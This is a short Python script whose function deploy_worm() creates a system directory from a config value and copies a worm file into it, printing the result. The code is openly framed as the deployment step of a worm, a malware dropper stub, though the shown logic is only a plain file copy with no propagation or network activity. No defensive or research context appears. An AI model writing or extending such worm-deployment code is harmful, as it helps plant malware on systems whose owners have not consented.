import os
import shutil
from config import WORM_PATH, DESTINATION_DIRECTORY

def deploy_worm():
    """
    Deploys the worm by copying it to the specified system directory.
    """
    try:
        # Ensure the destination directory exists
        if not os.path.exists(DESTINATION_DIRECTORY):
            os.makedirs(DESTINATION_DIRECTORY)

        # Copy the worm file to the destination directory
        shutil.copy(WORM_PATH, DESTINATION_DIRECTORY)
        print(f"Worm file deployed to {DESTINATION_DIRECTORY}")
    except Exception as e:
        print(f"Error deploying worm: {e}")

if __name__ == "__main__":
    deploy_worm()